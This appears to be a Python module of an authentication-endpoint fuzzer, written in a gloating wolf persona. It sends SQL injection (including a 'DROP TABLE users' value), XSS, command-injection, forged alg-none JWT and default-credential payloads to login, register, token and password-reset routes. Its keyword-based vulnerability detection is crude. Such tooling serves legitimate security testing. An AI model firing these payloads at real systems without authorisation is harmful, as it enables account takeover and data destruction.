"""
🐺 Secure Authentication Routes Fuzzer

*snarls with predatory glee* Specialized fuzzing for secure authentication endpoints
with advanced JWT manipulation and privilege escalation attacks!
"""

import asyncio
import httpx
import time
import json
from typing import List, Dict, Any, Optional
from rich.console import Console
from rich.panel import Panel

from ..core.results import FuzzResult, AuthBypassResult
from ..generators.payload_generator import PayloadGenerator

console = Console()

class SecureAuthFuzzer:
    """
    *circles with menacing intent* Specialized fuzzing for secure authentication endpoints
    
    *bares fangs with savage satisfaction* Targets JWT vulnerabilities,
    session hijacking, and privilege escalation attacks!
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.payload_generator = PayloadGenerator()
        self.session = httpx.AsyncClient(timeout=30.0)
        
    async def __aenter__(self):
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.aclose()
    
    async def fuzz_secure_auth_endpoints(self) -> List[FuzzResult]:
        """Fuzz all secure authentication endpoints with specialized attacks"""
        console.print(Panel.fit(
            "[bold red]🐺 FUZZING SECURE AUTHENTICATION ENDPOINTS[/bold red]\n"
            "*snarls with predatory glee* Time to break your secure authentication!",
            border_style="red"
        ))
        
        results = []
        
        # Fuzz each endpoint with specialized attacks
        endpoints = [
            ("/api/secure/auth/login", "POST", self._fuzz_secure_login_endpoint),
            ("/api/secure/auth/register", "POST", self._fuzz_secure_register_endpoint),
            ("/api/secure/auth/refresh", "POST", self._fuzz_secure_refresh_endpoint),
            ("/api/secure/auth/logout", "POST", self._fuzz_secure_logout_endpoint),
            ("/api/secure/auth/me", "GET", self._fuzz_secure_me_endpoint),
            ("/api/secure/auth/forgot-password", "POST", self._fuzz_secure_forgot_password_endpoint),
        ]
        
        for endpoint, method, fuzz_func in endpoints:
            console.print(f"🔍 Fuzzing {method} {endpoint}")
            endpoint_results = await fuzz_func(endpoint)
            results.extend(endpoint_results)
        
        return results
    
    async def _fuzz_secure_login_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure login endpoint with advanced authentication bypass attacks"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Advanced authentication bypass payloads
        login_payloads = [
            # Valid login attempt
            {
                "username": "testuser",
                "password": "testpass"
            },
            # SQL injection bypasses
            {
                "username": "' OR 1=1 --",
                "password": ""
            },
            {
                "username": "admin'--",
                "password": ""
            },
            {
                "username": "admin' #",
                "password": ""
            },
            {
                "username": "' or '1'='1",
                "password": "' or '1'='1"
            },
            {
                "username": "admin", 
                "password": "' OR 1=1 --"
            },
            {
                "username": "' UNION SELECT NULL,NULL,NULL--",
                "password": ""
            },
            {
                "username": "admin' OR 'x'='x",
                "password": "admin' OR 'x'='x"
            },
            # JWT manipulation attempts
            {
                "username": "admin",
                "password": "admin",
                "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0."
            },
            {
                "username": "admin",
                "password": "admin",
                "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.invalid"
            },
            # XSS attempts
            {
                "username": "<script>alert('XSS')</script>",
                "password": "test"
            },
            {
                "username": "admin",
                "password": "<img src=x onerror=alert('XSS')>"
            },
            {
                "username": "<svg onload=alert('XSS')>",
                "password": "test"
            },
            # Command injection attempts
            {
                "username": "; ls -la",
                "password": "test"
            },
            {
                "username": "admin",
                "password": "| whoami"
            },
            {
                "username": "` id `",
                "password": "test"
            },
            {
                "username": "admin",
                "password": "$(whoami)"
            },
            # Special character attempts
            {
                "username": "",
                "password": ""
            },
            {
                "username": " ",
                "password": " "
            },
            {
                "username": "null",
                "password": "null"
            },
            {
                "username": "undefined",
                "password": "undefined"
            },
            {
                "username": "\x00",
                "password": "\x00"
            },
            {
                "username": "a" * 1000,
                "password": "a" * 1000
            },
            # Common credential attacks
            {
                "username": "admin",
                "password": "admin"
            },
            {
                "username": "root",
                "password": "root"
            },
            {
                "username": "administrator",
                "password": "administrator"
            },
            {
                "username": "test",
                "password": "test"
            },
            {
                "username": "user",
                "password": "user"
            },
            {
                "username": "guest",
                "password": "guest"
            },
            {
                "username": "demo",
                "password": "demo"
            },
            {
                "username": "admin",
                "password": ""
            },
            {
                "username": "",
                "password": "admin"
            },
            {
                "username": "admin",
                "password": "password"
            },
            # JWT algorithm confusion
            {
                "username": "admin",
                "password": "admin",
                "algorithm": "none"
            },
            {
                "username": "admin",
                "password": "admin",
                "algorithm": "HS256"
            },
            {
                "username": "admin",
                "password": "admin",
                "algorithm": "RS256"
            },
            # Session hijacking attempts
            {
                "username": "admin",
                "password": "admin",
                "session_id": "admin"
            },
            {
                "username": "admin",
                "password": "admin",
                "session_id": "1"
            },
            {
                "username": "admin",
                "password": "admin",
                "session_id": "' OR 1=1 --"
            },
        ]
        
        for payload in login_payloads:
            result = await self._send_request(url, "POST", json=payload)
            results.append(result)
        
        return results
    
    async def _fuzz_secure_register_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure registration endpoint"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Registration payloads with malicious inputs
        register_payloads = [
            # Valid registration
            {
                "username": "newuser",
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            # SQL injection in registration
            {
                "username": "'; DROP TABLE users; --",
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "'; DROP TABLE users; --",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": "'; DROP TABLE users; --"
            },
            # XSS in registration
            {
                "username": "<script>alert('XSS')</script>",
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "<img src=x onerror=alert('XSS')>",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": "<script>alert('XSS')</script>"
            },
            # Command injection in registration
            {
                "username": "; ls -la",
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "| whoami",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": "` id `"
            },
            # Malformed inputs
            {
                "username": None,
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "",
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": None,
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": None
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": ""
            },
            # Missing required fields
            {
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123"
            },
            # Oversized inputs
            {
                "username": "a" * 1000,
                "password": "newpass123",
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "a" * 1000,
                "email": "newuser@example.com"
            },
            {
                "username": "newuser",
                "password": "newpass123",
                "email": "a" * 1000
            },
        ]
        
        for payload in register_payloads:
            result = await self._send_request(url, "POST", json=payload)
            results.append(result)
        
        return results
    
    async def _fuzz_secure_refresh_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure token refresh endpoint"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Token refresh payloads
        refresh_payloads = [
            # Valid refresh request
            {
                "refresh_token": "valid_refresh_token"
            },
            # Malicious refresh tokens
            {
                "refresh_token": "' OR 1=1 --"
            },
            {
                "refresh_token": "<script>alert('XSS')</script>"
            },
            {
                "refresh_token": "; ls -la"
            },
            {
                "refresh_token": "| whoami"
            },
            {
                "refresh_token": "` id `"
            },
            {
                "refresh_token": "$(whoami)"
            },
            # JWT manipulation
            {
                "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0."
            },
            {
                "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.invalid"
            },
            # Malformed inputs
            {
                "refresh_token": None
            },
            {
                "refresh_token": ""
            },
            {
                "refresh_token": "   "  # Whitespace only
            },
            # Missing required fields
            {},
            # Oversized inputs
            {
                "refresh_token": "a" * 1000
            },
        ]
        
        for payload in refresh_payloads:
            result = await self._send_request(url, "POST", json=payload)
            results.append(result)
        
        return results
    
    async def _fuzz_secure_logout_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure logout endpoint"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Logout payloads
        logout_payloads = [
            # Valid logout request
            {
                "token": "valid_access_token"
            },
            # Malicious tokens
            {
                "token": "' OR 1=1 --"
            },
            {
                "token": "<script>alert('XSS')</script>"
            },
            {
                "token": "; ls -la"
            },
            {
                "token": "| whoami"
            },
            {
                "token": "` id `"
            },
            {
                "token": "$(whoami)"
            },
            # JWT manipulation
            {
                "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0."
            },
            {
                "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.invalid"
            },
            # Malformed inputs
            {
                "token": None
            },
            {
                "token": ""
            },
            {
                "token": "   "  # Whitespace only
            },
            # Missing required fields
            {},
            # Oversized inputs
            {
                "token": "a" * 1000
            },
        ]
        
        for payload in logout_payloads:
            result = await self._send_request(url, "POST", json=payload)
            results.append(result)
        
        return results
    
    async def _fuzz_secure_me_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure current user endpoint"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Current user attacks with various headers
        me_attacks = [
            # No authentication
            {},
            # Malicious Authorization headers
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer ' OR 1=1 --"},
            {"Authorization": "Bearer <script>alert('XSS')</script>"},
            {"Authorization": "Bearer ; ls -la"},
            {"Authorization": "Bearer | whoami"},
            {"Authorization": "Bearer ` id `"},
            {"Authorization": "Bearer $(whoami)"},
            # JWT manipulation
            {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0."},
            {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.invalid"},
            # Malformed Authorization headers
            {"Authorization": "Invalid"},
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "   "},
            # Other authentication methods
            {"X-API-Key": "admin"},
            {"X-API-Key": "' OR 1=1 --"},
            {"X-API-Key": "<script>alert('XSS')</script>"},
            {"X-API-Key": "; ls -la"},
            {"X-API-Key": "| whoami"},
            {"X-API-Key": "` id `"},
            {"X-API-Key": "$(whoami)"},
            # Session-based attacks
            {"Cookie": "sessionid=admin"},
            {"Cookie": "sessionid=' OR 1=1 --"},
            {"Cookie": "sessionid=<script>alert('XSS')</script>"},
            {"Cookie": "sessionid=; ls -la"},
            {"Cookie": "sessionid=| whoami"},
            {"Cookie": "sessionid=` id `"},
            {"Cookie": "sessionid=$(whoami)"},
        ]
        
        for headers in me_attacks:
            result = await self._send_request(url, "GET", headers=headers)
            results.append(result)
        
        return results
    
    async def _fuzz_secure_forgot_password_endpoint(self, endpoint: str) -> List[FuzzResult]:
        """Fuzz secure forgot password endpoint"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Forgot password payloads
        forgot_payloads = [
            # Valid forgot password request
            {
                "email": "user@example.com"
            },
            # Malicious email addresses
            {
                "email": "' OR 1=1 --"
            },
            {
                "email": "<script>alert('XSS')</script>"
            },
            {
                "email": "; ls -la"
            },
            {
                "email": "| whoami"
            },
            {
                "email": "` id `"
            },
            {
                "email": "$(whoami)"
            },
            # Malformed inputs
            {
                "email": None
            },
            {
                "email": ""
            },
            {
                "email": "   "  # Whitespace only
            },
            # Missing required fields
            {},
            # Oversized inputs
            {
                "email": "a" * 1000
            },
            # Email enumeration attempts
            {
                "email": "admin@example.com"
            },
            {
                "email": "root@example.com"
            },
            {
                "email": "administrator@example.com"
            },
            {
                "email": "test@example.com"
            },
            {
                "email": "user@example.com"
            },
            {
                "email": "guest@example.com"
            },
        ]
        
        for payload in forgot_payloads:
            result = await self._send_request(url, "POST", json=payload)
            results.append(result)
        
        return results
    
    async def _send_request(self, url: str, method: str, **kwargs) -> FuzzResult:
        """Send a request and analyze for vulnerabilities"""
        start_time = time.time()
        
        try:
            response = await self.session.request(method, url, **kwargs)
            end_time = time.time()
            
            # Analyze response for secure auth-specific vulnerabilities
            vulnerability_detected, vulnerability_type = self._analyze_secure_auth_response(response, kwargs)
            
            return FuzzResult(
                url=url,
                method=method,
                payload=str(kwargs),
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type,
                response_body=response.text,
                response_text=response.text,
                response_headers=dict(response.headers),
                request_headers=kwargs.get('headers')
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method=method,
                payload=str(kwargs),
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e),
                response_body=None,
                response_text=None,
                response_headers=None,
                request_headers=kwargs.get('headers')
            )
    
    def _analyze_secure_auth_response(self, response: httpx.Response, request_kwargs: dict) -> tuple[bool, Optional[str]]:
        """Analyze response for secure auth-specific vulnerabilities"""
        response_text = response.text.lower()
        
        # Check for secure auth vulnerabilities
        if response.status_code == 200:
            # Check for successful authentication bypass
            if any(indicator in response_text for indicator in ["access_token", "refresh_token", "jwt", "authenticated", "login_successful"]):
                return True, "Secure Auth Bypass"
            
            # Check for information disclosure in auth responses
            if any(indicator in response_text for indicator in ["internal_error", "stack_trace", "database_error", "sql_error"]):
                return True, "Secure Auth Information Disclosure"
            
            # Check for JWT vulnerabilities
            if any(indicator in response_text for indicator in ["jwt_secret", "signing_key", "algorithm", "token_payload"]):
                return True, "Secure Auth JWT Information Disclosure"
        
        # Check for SQL injection in auth context
        if any(indicator in response_text for indicator in ["sql", "database", "mysql", "postgresql", "sqlite"]):
            return True, "Secure Auth SQL Injection"
        
        # Check for XSS in auth responses
        if any(indicator in response_text for indicator in ["<script>", "javascript:", "onerror="]):
            return True, "Secure Auth XSS"
        
        # Check for command injection
        if any(indicator in response_text for indicator in ["command not found", "permission denied", "whoami:", "ls:"]):
            return True, "Secure Auth Command Injection"
        
        # Check for privilege escalation
        if any(indicator in response_text for indicator in ["admin", "root", "administrator", "elevated", "privileged"]):
            # Only flag if we didn't send admin credentials
            if "json" in request_kwargs:
                payload = request_kwargs["json"]
                if isinstance(payload, dict):
                    username = payload.get("username", "")
                    if "admin" not in username.lower():
                        return True, "Secure Auth Privilege Escalation"
        
        return False, None

async def main():
    """Main execution function for testing"""
    async with SecureAuthFuzzer() as fuzzer:
        results = await fuzzer.fuzz_secure_auth_endpoints()
        console.print(f"🐺 Secure Authentication fuzzing completed: {len(results)} requests made")

if __name__ == "__main__":
    asyncio.run(main())
